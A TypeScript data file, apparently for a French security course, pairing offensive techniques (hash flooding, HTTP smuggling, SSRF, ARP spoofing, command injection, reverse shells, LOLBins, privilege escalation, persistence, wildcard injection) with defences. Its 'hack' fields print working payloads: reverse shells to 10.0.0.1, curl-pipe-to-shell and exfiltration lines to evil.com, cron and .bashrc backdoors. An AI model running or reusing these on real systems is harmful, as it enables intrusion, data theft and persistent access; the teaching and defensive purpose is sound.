// Code Noir v2 — techniques offensive + defensive mappées aux modules.
// Une technique est "unlocked" quand le moduleNumber ≤ progression de l'user.
//
// Modules offensive-security (5) :
//   0 = Algorithmie
//   1 = Réseau & protocoles
//   2 = Shell & systèmes Unix
//   3 = C & bas niveau
//   4 = Python (outillage)
//
// Cadre légal : toute technique offensive ne s'exerce QUE sur des labs et des
// cibles explicitement autorisées (machines à toi, ranges légaux, programmes de
// bug bounty avec scope écrit). Tester sans autorisation est un délit.

export type CodeNoirTechnique = {
  slug: string;
  moduleNumber: number;
  kind: "offensive" | "defensive" | "duo";
  language: "js" | "python" | "both" | "concept";
  title: string;
  oneLiner: string;
  hack: string;
  antiHack: string;
  ctfRef?: string;
  cve?: string;
  /** Mots-clés de recherche YouTube curated (fallback = title). */
  youtubeSearch?: string;
  /** IDs YouTube validés manuellement — affichés en embed. Si vide, bouton "chercher". */
  youtubeIds?: string[];
};

export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
  // ==================== M00 — Algorithmie ====================
  {
    slug: "hash-flooding-dos",
    moduleNumber: 0,
    kind: "duo",
    language: "concept",
    title: "Hash Flooding — DoS par collisions de hash",
    oneLiner: "Forger des clés qui collisionnent toutes → la hashmap dégénère en O(n²), le CPU explose.",
    hack: "Une hashmap (dict Python, Map/objet JS, hashtable C) promet du O(1) **amorti**. Le pire cas réel est O(n) par opération : quand toutes les clés tombent dans le même bucket, l'insertion devient une recherche linéaire, et insérer n clés coûte O(n²). C'est le pont direct avec le cours : **complexité amortie vs pire cas**.\n\n**Le principe de l'attaque** : si la fonction de hash est déterministe et publique (ancien `hash()` Python pré-2012, anciens moteurs JS, `Object` clés en string), l'attaquant **précalcule** un jeu de clés distinctes qui hashent toutes vers la même valeur, puis les envoie d'un coup.\n```\n# pseudo : N clés, toutes même bucket\nkeys = generate_colliding_keys(target_hash_fn, n=50000)\nPOST /api  { \"a..1\": 1, \"a..2\": 1, ... }   # 50k champs colliding\n```\nUn serveur qui parse ces 50k clés dans un dict passe de quelques ms à plusieurs **secondes** de CPU sur un seul paquet de quelques centaines de Ko → déni de service asymétrique (peu de bande passante, gros coût serveur).\n\n**Surfaces** : parsing de JSON/form-data/query-string vers un dict, headers HTTP, n'importe quelle structure qui ingère des clés contrôlées par l'attaquant.\n\n**Réf historique** : 28C3 (2011) « Efficient Denial of Service Attacks on Web Application Platforms » — a touché PHP, Python, Java, Ruby, ASP.NET en même temps, d'où l'adoption du hash randomisé.\n\n**Cadre légal** : à reproduire uniquement sur un service à toi / un lab.",
    antiHack: "1. **Hash randomisé par processus** : SipHash (Python ≥ 3.3 avec `PYTHONHASHSEED` aléatoire par défaut, V8 moderne) → l'attaquant ne peut plus précalculer les collisions hors-ligne.\n2. **Plafonner la taille de l'input AVANT de construire la structure** : limite de champs/clés par requête, taille de body, profondeur JSON.\n3. **Structures à pire cas borné quand l'input est hostile** : arbre équilibré (O(log n) garanti) au lieu d'une hashtable, ou hashmap qui bascule un bucket en arbre au-delà d'un seuil (cf. `HashMap` Java 8 → arbre rouge-noir).\n4. **Côté C** : ne jamais exposer une hashtable maison à fonction de hash fixe sur de l'input réseau sans seed aléatoire + limite de charge.\n5. Pour de la pure lookup statique non hostile, le risque est nul — c'est la combinaison *clés contrôlées par l'attaquant + hash prévisible* qui tue.",
    ctfRef: "28C3 « Efficient DoS on Web Application Platforms » ; exercices de complexité (pire cas hashmap)",
    cve: "CVE-2011-4885 (PHP), CVE-2012-1150 (Python pré-randomisation), CVE-2011-4815 (Ruby)",
    youtubeSearch: "hash flooding DoS hashmap collision attack siphash",
  },

  // ==================== M01 — Réseau & protocoles ====================
  {
    slug: "http-smuggling",
    moduleNumber: 1,
    kind: "duo",
    language: "concept",
    title: "HTTP Request Smuggling (CL.TE / TE.CL)",
    oneLiner: "Désaccord proxy/backend sur les bordures de requête → injecte une 2e requête.",
    hack: "**Payload CL.TE** (front utilise Content-Length, back utilise Transfer-Encoding):\n```http\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n```\nLe proxy front voit une requête de 13 bytes. Le backend voit la requête se terminer au '0\\r\\n\\r\\n' (chunked terminator) et traite 'SMUGGLED' comme le **début** d'une nouvelle requête → préfixé devant la requête de la victime suivante. Tu peux capturer ses cookies via un endpoint qui reflète body.\n\n**Outils**: smuggler.py (Python), HTTP Request Smuggler (Burp extension).\n\n**Cadre légal** : labs PortSwigger / cibles autorisées uniquement.",
    antiHack: "1. Désactiver Transfer-Encoding côté backend si pas nécessaire.\n2. Front proxy doit rejeter requêtes avec **les deux headers** simultanément.\n3. Connection: close après chaque requête.\n4. HTTP/2 end-to-end élimine cette classe d'attaques (multiplexing au niveau frame).",
    ctfRef: "PortSwigger Web Academy — HTTP request smuggling (~15 labs)",
    // "HTTP Desync Attacks: Smashing into the Cell Next Door" (DEF CON 27, James 'albinowax' Kettle)
    // "HTTP/2: The Sequel is Always Worse" — DEF CON 30 Browser-Powered Desync (James Kettle)
    youtubeIds: ["w-eJM2Pc0KI", "B8KW8KPVcUo"],
  },
  {
    slug: "host-header-injection",
    moduleNumber: 1,
    kind: "duo",
    language: "js",
    title: "Host Header Poisoning",
    oneLiner: "Le serveur fait confiance au header Host envoyé par le client.",
    hack: "**Password reset poisoning** :\n```http\nPOST /reset-password HTTP/1.1\nHost: evil.com\n\nemail=victim@target.com\n```\nSi le code génère le lien via `${req.headers.host}/reset?token=...`, la victime reçoit un mail avec lien vers evil.com qui capture le token.\n\n**Cache poisoning** : modifier Host pour forcer un cache mismatch, le contenu poison est servi aux victimes suivantes.\n\n**Bypass auth** : `Host: localhost` ou `Host: 127.0.0.1` parfois trigger un mode admin.",
    antiHack: "Whitelist hostnames acceptés au niveau du reverse proxy (Caddy, Nginx). Côté app : utiliser PUBLIC_URL env var pour construire les liens externes. Jamais req.headers.host pour les emails.",
    ctfRef: "PortSwigger — Host header attacks (8 labs)",
    // "PortSwigger - HTTP Host Header Attacks - Lab #1 Basic password reset poisoning" (Rana Khalil style walkthrough)
    // "Host Header Injection | Password Reset Poisoning | Detailed Explanation"
    youtubeIds: ["v2WgXwplnE0", "fDvWU7aTcIs"],
  },
  {
    slug: "dns-rebinding",
    moduleNumber: 1,
    kind: "offensive",
    language: "concept",
    title: "DNS Rebinding",
    oneLiner: "Le navigateur considère deux IPs comme la même origin si même hostname.",
    hack: "1. Tu contrôles evil.com → résous d'abord vers 1.2.3.4 (ton serveur).\n2. Victime visite evil.com, ton JS s'exécute.\n3. TTL très court (3s).\n4. Tu changes la résolution DNS vers 192.168.1.1 (le routeur local de la victime).\n5. Ton JS rouvre un fetch vers evil.com → frappe maintenant le routeur local **avec credentials**.\n\nUtile pour accéder à des services internes (admin panel routeur, RPC localhost, etc.).\n\n**Outils**: rbndr.us, Singularity of Origin (NCC Group).\n\n**Cadre légal** : uniquement sur ton propre réseau / lab.",
    antiHack: "Côté service interne : exiger un header secret (`X-Internal-Auth`) que le navigateur ne peut pas envoyer cross-origin. CORS strict. Validation du Host header. Pour les routeurs : changer mot de passe par défaut, désactiver UPnP.",
    ctfRef: "TryHackMe — DNS rebinding rooms",
    // "State of DNS Rebinding Attacks & Singularity of Origin" — DEF CON 27, Gerald Doussot (NCC Group)
    // "$5,000 Gitlab SSRF by DNS rebinding explained - Hackerone"
    youtubeIds: ["y9-0lICNjOQ", "R5WB8h7hkrU"],
  },
  {
    slug: "arp-spoofing-mitm",
    moduleNumber: 1,
    kind: "duo",
    language: "concept",
    title: "ARP Spoofing → Man-in-the-Middle sur LAN",
    oneLiner: "Empoisonner le cache ARP du LAN pour t'intercaler entre la victime et la gateway.",
    hack: "ARP n'a **aucune authentification** : « qui a 192.168.1.1 ? » et le premier à répondre « c'est moi » gagne. L'attaquant sur le même segment L2 envoie des réponses ARP forgées (gratuitous ARP) pour associer l'IP de la gateway à **sa propre MAC**, et l'IP de la victime à sa MAC côté gateway. Résultat : tout le trafic transite par lui (MITM), il peut sniffer, altérer, injecter.\n```bash\n# activer le forwarding pour ne pas couper la victime\nsysctl -w net.ipv4.ip_forward=1\n\n# empoisonner victime <-> gateway (bettercap)\nbettercap -iface eth0\n> set arp.spoof.targets 192.168.1.50\n> arp.spoof on\n> net.sniff on\n\n# ou en one-liner historique\narpspoof -i eth0 -t 192.168.1.50 192.168.1.1\narpspoof -i eth0 -t 192.168.1.1 192.168.1.50\n```\nUne fois au milieu : sniff de crédentiels en clair, DNS spoofing, downgrade TLS (cf. tls-downgrade / sslstrip), injection de payloads dans le HTTP non chiffré.\n\n**Outils** : ettercap, bettercap, `arpspoof` (dsniff), Wireshark pour la capture.\n\n**Cadre légal** : un MITM intercepte des communications privées — strictement réservé à ton propre LAN / un lab isolé / un mandat de pentest écrit.",
    antiHack: "1. **Entrées ARP statiques** pour la gateway sur les postes critiques (`arp -s`).\n2. **Dynamic ARP Inspection (DAI)** + DHCP snooping sur les switchs managés : rejette les réponses ARP incohérentes avec le bail DHCP.\n3. **802.1X / port security** : limite les MAC par port, authentifie les machines avant l'accès au LAN.\n4. **Chiffrement de bout en bout** (TLS partout, VPN, SSH) : même intercalé, l'attaquant ne lit/altère rien d'utile.\n5. **Détection** : `arpwatch`, alertes sur changement IP→MAC, segmentation réseau (VLAN) pour réduire le domaine de broadcast.",
    ctfRef: "TryHackMe — Network Services / MITM rooms ; HTB Academy — Network Enumeration & MITM",
    youtubeSearch: "ARP spoofing MITM bettercap ettercap tutorial",
  },
  {
    slug: "ssrf",
    moduleNumber: 1,
    kind: "duo",
    language: "concept",
    title: "SSRF — Server-Side Request Forgery",
    oneLiner: "Backend fetch une URL fournie par l'user → attaque le réseau interne + les metadata cloud.",
    hack: "**Code vulnérable** :\n```js\napp.post('/preview', async (req) => {\n  return await fetch(req.body.url);   // BUG: URL contrôlée par l'user\n});\n```\n\n**Cibles classiques** :\n- `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → **clés IAM AWS** (IMDSv1).\n- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` → **token GCP**.\n- `http://localhost:6379/` → Redis non authentifié, exécution de commandes.\n- `http://127.0.0.1:9200/_cluster/health` → Elasticsearch interne.\n- `gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a` → forger une commande Redis arbitraire via gopher://.\n- `file:///etc/passwd` → si le client accepte file://.\n\n**Bypass de filtres** :\n- IP en décimal : `http://2130706433/` (= 127.0.0.1)\n- IP en hex : `http://0x7f000001/`, octal : `http://0177.0.0.1/`\n- IPv6 mappé : `http://[::ffff:127.0.0.1]/`\n- DNS rebinding (cf. dns-rebinding), open redirect chaîné.\n\n**Outils** : SSRFmap, Gopherus (payloads gopher), Burp Collaborator (SSRF blind).\n\n**Cadre légal** : labs PortSwigger / scope de bug bounty uniquement.",
    antiHack: "1. **Allowlist** explicite de domaines/IPs autorisés.\n2. **Refuser les IP privées/réservées** : 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8, ::1.\n3. **Résoudre avant le fetch + comparer l'IP au moment du fetch** (anti DNS rebinding).\n4. Désactiver les schemes non-HTTP (file://, gopher://, dict://, ldap://).\n5. AWS : **forcer IMDSv2** (token requis) ; couper l'accès réseau aux metadata depuis les conteneurs applicatifs (egress filtering / network policy).\n6. Faire sortir le trafic sortant par un proxy d'egress qui applique l'allowlist.",
    ctfRef: "PortSwigger SSRF (8 labs), HackTheBox (Lame, Magic, Tabby)",
    cve: "CVE-2021-22214 (GitLab SSRF), Capital One breach 2019 (AWS SSRF → IAM)",
    // "Server-Side Request Forgery (SSRF) Explained" — NahamSec
    // "Deep Dive into Server-Side Request Forgery SSRF Exploitation"
    // "Server-Side Request Forgery (SSRF) Detailed Walkthrough -- [TryHackMe LIVE!]"
    youtubeIds: ["Gk3_Q-3R6jc", "_NSmeqeS7Go", "V3zvmtjSuVM"],
  },
  {
    slug: "tls-downgrade",
    moduleNumber: 1,
    kind: "duo",
    language: "concept",
    title: "TLS Downgrade & SSL Stripping",
    oneLiner: "Forcer la victime à parler en clair ou dans une version TLS cassée, depuis une position MITM.",
    hack: "Une fois intercalé (cf. arp-spoofing-mitm), l'attaquant attaque la **mise en place** du chiffrement plutôt que le chiffrement lui-même.\n\n**SSL stripping** (`sslstrip`, Moxie Marlinspike) : l'utilisateur tape `site.com` (HTTP par défaut). Le MITM intercepte la redirection vers HTTPS, garde une connexion **HTTPS avec le serveur** mais sert la page en **HTTP clair à la victime**. Tout (cookies, mot de passe) transite en clair côté victime.\n```bash\n# position MITM déjà établie + redirection du port 80\nsslstrip -l 8080\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\n```\n\n**Downgrade de version/cipher** : manipuler le ClientHello/ServerHello ou exploiter des fallbacks pour forcer SSLv3/TLS 1.0 et des suites faibles (export, RC4) → ouvre la porte à POODLE (SSLv3), FREAK/Logjam (export), BEAST. Le serveur qui accepte encore ces versions est complice.\n\n**Outils** : bettercap (`set http.proxy.sslstrip true`), sslstrip, mitmproxy, testssl.sh côté audit.\n\n**Cadre légal** : intercepte du trafic privé → labs / réseau perso / mandat écrit uniquement.",
    antiHack: "1. **HSTS** (`Strict-Transport-Security`) + **inscription dans la preload list** : le navigateur refuse le HTTP pour ce domaine, sslstrip ne peut plus rétrograder.\n2. **TLS 1.3 minimum** (1.2 toléré) ; **désactiver SSLv3, TLS 1.0/1.1** et toutes les suites faibles (RC4, export, 3DES).\n3. **Rediriger 301 HTTP→HTTPS** et marquer les cookies `Secure` (jamais envoyés en clair).\n4. **Certificate pinning** sur les apps mobiles / clients lourds pour casser le MITM avec un cert forgé.\n5. **Refuser le clear** par design : pas de fallback HTTP, OCSP stapling, audit régulier (`testssl.sh`, SSL Labs).",
    ctfRef: "TryHackMe — TLS/MITM rooms ; SSL Labs server test ; testssl.sh",
    cve: "CVE-2014-3566 (POODLE/SSLv3), CVE-2015-0204 (FREAK), Logjam (DH export)",
    youtubeSearch: "sslstrip HSTS bypass TLS downgrade attack explained",
  },

  // ==================== M02 — Shell & systèmes Unix ====================
  {
    slug: "command-injection",
    moduleNumber: 2,
    kind: "duo",
    language: "both",
    title: "OS Command Injection (shell)",
    oneLiner: "Input user concaténé dans une commande shell → exécution arbitraire côté serveur.",
    hack: "**Code vulnérable** (Node) :\n```js\nimport { exec } from 'node:child_process';\napp.post('/ping', (req) => {\n  // BUG: req.body.host concaténé dans une string shell\n  exec(`ping -c 1 ${req.body.host}`, (e, out) => res.send(out));\n});\n```\nLe shell interprète les métacaractères. Payloads dans `host` :\n- `8.8.8.8; id` → exécute `ping` PUIS `id`.\n- `8.8.8.8 && curl evil.com/x.sh | sh` → télécharge + exécute un script.\n- `8.8.8.8 | nc evil.com 4444 -e /bin/bash` → reverse shell.\n- ``8.8.8.8 `whoami` `` ou `$(whoami)` → substitution de commande.\n\n**Blind (pas de sortie)** : exfil via DNS/HTTP\n```\n8.8.8.8; curl http://evil.com/$(whoami)\n8.8.8.8; sleep 10   # time-based : si la réponse met 10s → vulnérable\n```\n\n**Bypass de filtres faibles** :\n- Espaces filtrés : `cat${IFS}/etc/passwd` ou `{cat,/etc/passwd}`.\n- Mots-clés filtrés : `c''at`, `c\\at`, `/bin/c?t`.\n\n**Outils** : Commix (exploitation auto), PayloadsAllTheThings (Command Injection).\n\n**Cadre légal** : cibles autorisées / DVWA / labs uniquement.",
    antiHack: "1. **Ne jamais passer par un shell** avec de l'input : `execFile`/`spawn` avec un **tableau d'arguments**, jamais `exec()` ni `shell: true`.\n```js\nimport { execFile } from 'node:child_process';\nexecFile('ping', ['-c', '1', host], cb); // host est un argument, pas du code shell\n```\n2. **Valider** strictement (Zod) : `host` = IP ou hostname via regex/`z.string().ip()`.\n3. **Allowlist** quand c'est possible plutôt que blocklist de métacaractères.\n4. Préférer une **lib native** (ex: requête réseau) à l'appel d'un binaire système.\n5. Principe du moindre privilège : process applicatif non-root, FS read-only.",
    ctfRef: "PortSwigger — OS command injection (5 labs), DVWA Command Injection, TryHackMe",
    cve: "Shellshock CVE-2014-6271 (bash), CVE-2021-44228 chaînes RCE",
    // "What is command injection?" — PortSwigger Web Security Academy
    // "OS Command Injection Explained | Web Application Hacking & Exploitation Demo"
    // "Command Injection - How to Exploit Web Servers (With DVWA)"
    youtubeIds: ["8PDDjCW5XWw", "5Feb3sWd1Ko", "frirfMQesQk"],
  },
  {
    slug: "reverse-shell",
    moduleNumber: 2,
    kind: "offensive",
    language: "both",
    title: "Reverse Shell & Bind Shell",
    oneLiner: "Après une RCE, ouvrir un canal interactif vers la machine compromise — reverse pour traverser le NAT/firewall.",
    hack: "Deux modèles :\n- **Bind shell** : la cible écoute sur un port, l'attaquant s'y connecte. Souvent bloqué par le firewall entrant.\n- **Reverse shell** : la cible se **connecte vers** l'attaquant. Traverse le NAT et la plupart des firewalls (l'egress est rarement filtré). C'est le standard post-exploitation.\n\n**Listener attaquant** :\n```bash\nnc -lvnp 4444          # ou : rlwrap nc -lvnp 4444 pour l'historique\n```\n\n**Payloads reverse (sur la cible)** :\n```bash\n# bash pur via /dev/tcp\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n# netcat (avec ou sans -e)\nnc 10.0.0.1 4444 -e /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f\n\n# python\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# socat (TTY complet d'emblée)\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444\n```\n\n**Upgrade du TTY** (un shell `nc` est borgne : pas de Ctrl-C, pas de tab) :\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl-Z, puis côté attaquant :\nstty raw -echo; fg\n# dans le shell :\nexport TERM=xterm; stty rows 50 cols 200\n```\n\n**Réfs** : PayloadsAllTheThings (Reverse Shell Cheatsheet), revshells.com.\n\n**Cadre légal** : un reverse shell est un outil d'intrusion — UNIQUEMENT sur tes machines / un lab (pwn.college, HTB, OverTheWire) / un mandat écrit. L'utiliser sur un tiers est un délit.",
    antiHack: "1. **Egress filtering** : la défense la plus efficace. Bloquer les connexions sortantes non nécessaires (le reverse shell a besoin de sortir).\n2. **EDR / détection comportementale** : `bash -i` redirigé vers une socket, `/dev/tcp`, `nc -e`, des process enfants de serveurs web → alertes.\n3. **Moindre privilège** : process applicatif non-root, FS read-only, conteneur sans `/bin/bash`/`nc`/`python` (distroless).\n4. **Pas de binaires offensifs** sur les serveurs de prod (`nc`, `socat`, compilateurs).\n5. **auditd / Sysmon** : logger les exec et les connexions réseau sortantes ; corréler.\n6. Couper la cause racine : la RCE qui permet de lancer le shell (cf. command-injection).",
    ctfRef: "pwn.college, TryHackMe — Reverse shells, HTB, revshells.com / PayloadsAllTheThings",
    youtubeSearch: "reverse shell bash dev tcp netcat TTY upgrade stty",
  },
  {
    slug: "lolbins-fileless",
    moduleNumber: 2,
    kind: "offensive",
    language: "concept",
    title: "Living off the Land (LOLBins) & Fileless",
    oneLiner: "Abuser des binaires légitimes déjà présents pour agir sans déposer d'outil détectable.",
    hack: "Plutôt que d'uploader un malware (signé, scanné, loggué), l'attaquant **détourne les outils déjà là**. Aucun binaire suspect sur le disque → l'AV basé sur les signatures ne voit rien.\n\n**Linux (GTFOBins logic)** :\n```bash\n# download + exec sans déposer de fichier persistant\ncurl http://evil/x.sh | bash\nwget -qO- http://evil/x.sh | sh\n\n# exécution en mémoire via interpréteur déjà présent\npython3 -c \"$(curl -s http://evil/stage.py)\"\nperl -e '...'\n\n# exfiltration avec des outils \"normaux\"\ntar czf - /etc | curl -T - http://evil/loot\n```\nLecture/écriture/exécution via des binaires inattendus (`awk`, `find -exec`, `tar --checkpoint-action`, `git`, `tcpdump -z`) — c'est la base de l'escalade GTFOBins.\n\n**Windows** (LOLBAS) : `certutil -urlcache -f http://evil x.exe` (download), `mshta`, `regsvr32` (scriptlets distants), `powershell -enc <base64>` / `IEX (New-Object Net.WebClient).DownloadString(...)` → **fileless**, charge le code direct en mémoire.\n\n**Fileless** = le payload ne touche jamais le disque (PowerShell en RAM, injection de process, exécution depuis le registre). Survit moins au reboot mais échappe à l'analyse forensique disque.\n\n**Réfs** : projet **GTFOBins** (Unix), **LOLBAS** (Windows).\n\n**Cadre légal** : techniques de post-exploitation — labs / red team mandatée uniquement.",
    antiHack: "1. **Application allowlisting** : n'autoriser que les binaires connus à s'exécuter (AppLocker/WDAC côté Win, fapolicyd/SELinux côté Linux).\n2. **Restreindre les interpréteurs** et outils réseau sur les serveurs qui n'en ont pas besoin (pas de `curl`/`python`/`powershell` accessibles au service web ; conteneurs distroless).\n3. **Logging d'exécution** : auditd (`execve`) / Sysmon (event ID 1) + journalisation PowerShell (ScriptBlock logging, transcription) → corréler les `certutil -urlcache`, `IEX`, `bash -c \"$(curl ...)\"`.\n4. **Détection comportementale (EDR)** : process web qui lance un interpréteur, interpréteur qui ouvre une socket, encodage base64 dans une ligne de commande.\n5. **Egress filtering** : couper le `curl evil | sh` à la source.\n6. **Baseline** des process/parents légitimes ; alerter sur les chaînes parent-enfant anormales.",
    ctfRef: "GTFOBins, LOLBAS ; HTB Academy — Linux/Windows Privilege Escalation",
    youtubeSearch: "living off the land LOLBins GTFOBins fileless attack detection",
  },
  {
    slug: "suid-privesc",
    moduleNumber: 2,
    kind: "duo",
    language: "concept",
    title: "Escalade de privilèges Linux (SUID, sudo, PATH, capabilities)",
    oneLiner: "Passer d'un user limité à root en abusant d'un binaire SUID, d'un sudo permissif ou d'un PATH manipulable.",
    hack: "Après un accès initial (cf. reverse-shell), on cherche le chemin vers root. Quatre classiques.\n\n**1. Binaires SUID** : le bit SUID fait exécuter le binaire avec les droits du **propriétaire** (souvent root). Si ce binaire peut lancer un shell ou lire/écrire des fichiers arbitraires, c'est gagné.\n```bash\nfind / -perm -4000 -type f 2>/dev/null   # lister les SUID\n# si find est SUID-root (exemple GTFOBins) :\nfind . -exec /bin/sh -p \\; -quit\n# si bash/cp/vim/nmap/... est SUID, GTFOBins donne le one-liner\n```\n\n**2. sudo mal configuré** :\n```bash\nsudo -l   # ce que je peux lancer en sudo\n# 'NOPASSWD: /usr/bin/vim' -> :!sh dans vim = shell root\n# 'sudo less /var/log/x' -> !sh\n# CVE sudo (Baron Samedit) -> overflow direct vers root\n```\n\n**3. PATH hijacking** : un binaire SUID/root appelle une commande **sans chemin absolu** (`system(\"service ...\")`). On place un faux `service` en début de PATH.\n```bash\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service && chmod +x /tmp/service\n./vuln_suid_binary\n```\n\n**4. Capabilities** : plus fines que SUID mais aussi exploitables.\n```bash\ngetcap -r / 2>/dev/null\n# python3 avec cap_setuid+ep :\npython3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'\n```\n\n**Outils** : LinPEAS, linux-exploit-suggester, **GTFOBins** (le réflexe pour chaque binaire trouvé).\n\n**Cadre légal** : sur tes VMs / labs (pwn.college, HTB, TryHackMe) uniquement.",
    antiHack: "1. **Auditer les SUID** régulièrement (`find / -perm -4000`) et retirer le bit partout où il n'est pas indispensable.\n2. **sudoers minimal** : pas de `NOPASSWD` large, pas de binaires qui peuvent spawn un shell (vim, less, find, awk…) ; préférer des commandes wrappées et restreintes. Maintenir sudo à jour (Baron Samedit, etc.).\n3. **Toujours des chemins absolus** dans le code privilégié + `secure_path` dans sudoers ; ne jamais hériter d'un PATH contrôlé par l'utilisateur.\n4. **Capabilities granulaires** auditées (`getcap`), retirées si inutiles ; éviter `cap_setuid`/`cap_dac_override` sur des interpréteurs.\n5. **Moindre privilège général** : pas de compilateurs/interpréteurs superflus, MAC (SELinux/AppArmor), partitions `nosuid` pour `/tmp` et `/home`.\n6. **Patch management** : la majorité des privesc « kernel » viennent d'un noyau non patché.",
    ctfRef: "GTFOBins, pwn.college, TryHackMe — Linux PrivEsc, HTB Academy",
    cve: "CVE-2021-3156 (sudo Baron Samedit), CVE-2021-4034 (PwnKit/polkit)",
    youtubeSearch: "linux privilege escalation SUID sudo PATH capabilities GTFOBins",
  },
  {
    slug: "cron-persistence",
    moduleNumber: 2,
    kind: "duo",
    language: "concept",
    title: "Persistance Linux (cron, systemd timers, .bashrc, SSH keys)",
    oneLiner: "Après l'accès, se ménager un retour automatique qui survit au reboot et à la fermeture du shell.",
    hack: "La persistance = garder l'accès sans ré-exploiter. Quelques nids classiques (un défenseur doit savoir où regarder).\n\n**1. cron** : tâches planifiées exécutées par cron, idéalement en root.\n```bash\n(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1') | crontab -\n# ou dépose dans /etc/cron.d/, /etc/cron.daily/ (root)\necho '* * * * * root curl -s http://evil/x.sh|bash' > /etc/cron.d/update\n```\n\n**2. systemd timers / services** : équivalent moderne, souvent moins surveillé.\n```ini\n# ~/.config/systemd/user/backdoor.service + .timer\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n```\n\n**3. fichiers de profil shell** : `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `/etc/profile.d/*.sh` → exécutés à chaque ouverture de session.\n```bash\necho 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &' >> ~/.bashrc\n```\n\n**4. SSH** : ajouter sa clé publique dans `~/.ssh/authorized_keys` → reconnexion silencieuse, pas de mot de passe.\n```bash\necho 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys\n```\nAutres nids : `/etc/rc.local`, hooks git, modules PAM, `LD_PRELOAD`/`/etc/ld.so.preload`.\n\n**Cadre légal** : techniques de post-exploitation — labs / mandat uniquement.",
    antiHack: "1. **Baseline + détection des changements** : surveiller crontabs (`/var/spool/cron`, `/etc/cron*`), units systemd, `authorized_keys`, fichiers de profil avec un outil d'intégrité (**AIDE**, Tripwire, auditd `-w`).\n2. **Intégrité de fichiers** sur les emplacements sensibles : toute modif de `~/.ssh/authorized_keys`, `~/.bashrc`, `/etc/cron.d/` → alerte.\n3. **Moindre privilège** : un service compromis non-root ne peut pas écrire dans `/etc/cron.d` ni en root crontab.\n4. **Clés SSH gérées centralement** (certificats SSH à durée courte, `AuthorizedKeysCommand`) plutôt que des `authorized_keys` modifiables localement ; désactiver l'auth par mot de passe.\n5. **Inventaire des units systemd / timers** et revue régulière ; alerter sur les units en espace utilisateur inattendues.\n6. **Réponse à incident** : après une compromission, ne pas se contenter de fermer le trou — chasser toutes les persistances avant de déclarer la machine propre.",
    ctfRef: "TryHackMe — Persistence ; HTB Academy ; MITRE ATT&CK T1053 (Scheduled Task/Job)",
    youtubeSearch: "linux persistence cron systemd timer bashrc authorized_keys detection",
  },
  {
    slug: "wildcard-injection",
    moduleNumber: 2,
    kind: "duo",
    language: "concept",
    title: "Wildcard Injection (tar / chown / rsync)",
    oneLiner: "Créer des fichiers dont le nom ressemble à une option : le glob `*` les passe en arguments à la commande.",
    hack: "Le shell développe `*` en **liste de noms de fichiers** AVANT de lancer la commande. Si un script (souvent un cron root) fait `tar czf backup.tar.gz *` dans un dossier où **l'attaquant peut créer des fichiers**, il suffit de créer des fichiers nommés comme des **options** de `tar`.\n\n**tar → exécution de commande** (le grand classique) :\n```bash\ncd /dossier/sauvegardé\n# 1. le payload\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh\n# 2. des fichiers nommés comme des options tar\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh shell.sh'\n# quand le cron root lance `tar czf b.tgz *`, le glob devient :\n# tar czf b.tgz --checkpoint=1 --checkpoint-action=exec=sh\\ shell.sh ...\n# -> tar exécute shell.sh en root -> /tmp/bash SUID root\n```\n\n**chown / chmod --reference** : `touch -- '--reference=fichier_appartenant_a_attaquant'` → la cible adopte le propriétaire/les droits d'un fichier qu'on contrôle.\n\n**rsync -e** : un nom de fichier `-e sh shell.sh` injecte une commande via l'option `--rsh`.\n\n**Outils** : aucun, juste `touch --` et la connaissance des options dangereuses (PayloadsAllTheThings — wildcard).\n\n**Cadre légal** : sur tes VMs / labs uniquement.",
    antiHack: "1. **Préfixer les globs par `./`** : `tar czf b.tgz ./*` ou `chown user ./*` → les noms commencent par `./`, ils ne peuvent plus passer pour des options.\n2. **Utiliser `--` (fin des options)** quand c'est possible : `tar czf b.tgz -- *` indique que tout ce qui suit est un opérande, pas une option.\n3. **getopt strict** dans tes propres scripts/binaires ; ne pas accepter d'options après le `--`.\n4. **Ne pas globber de l'input non maîtrisé** : un répertoire où des tiers écrivent ne doit pas être traité par un script root qui fait `*`. Lister explicitement, ou passer par `find ... -print0 | xargs -0`.\n5. **Moindre privilège** : la tâche de backup/sauvegarde ne devrait pas tourner en root dans un dossier writable par l'attaquant.\n6. **Permissions** : restreindre l'écriture dans les répertoires traités par des jobs privilégiés.",
    ctfRef: "PayloadsAllTheThings — Wildcard ; TryHackMe / HTB Linux PrivEsc (wildcard tar)",
    youtubeSearch: "wildcard injection tar checkpoint-action privilege escalation",
  },

  // ==================== M03 — C & bas niveau ====================
  {
    slug: "buffer-overflow-stack",
    moduleNumber: 3,
    kind: "duo",
    language: "concept",
    title: "Stack Buffer Overflow",
    oneLiner: "Écrire au-delà d'un tampon sur la pile jusqu'à écraser l'adresse de retour — et comprendre ce qui le bloque aujourd'hui.",
